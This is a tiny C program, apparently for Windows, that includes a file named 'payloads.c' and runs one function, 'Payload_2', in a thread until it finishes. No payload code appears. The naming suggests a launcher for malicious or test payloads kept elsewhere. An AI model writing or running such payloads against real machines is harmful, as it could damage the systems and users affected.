#include "payloads.c"

int main()
{
    HANDLE thread = CreateThread(0,0, (LPTHREAD_START_ROUTINE)Payload_2, 0, 0, 0);
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    return 0;
}